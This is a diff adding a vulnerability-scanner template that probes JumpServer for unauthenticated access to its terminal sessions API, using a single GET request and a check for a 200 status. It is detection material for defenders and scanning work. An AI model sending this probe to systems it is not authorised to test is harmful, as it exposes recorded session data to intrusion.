@@ -1,0 +1,21 @@
+id: poc-yaml-jumpserver-session-replay-unauth
+
+info:
+  name: poc-yaml-jumpserver-session-replay-unauth
+  author: Chaitin
+  severity: medium
+  tags: xray-converted,unauth
+  reference:
+    - https://stack.chaitin.com/techblog/detail/156
+
+http:
+  - raw:
+      - |
+        GET /api/v1/terminal/sessions/?limit=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
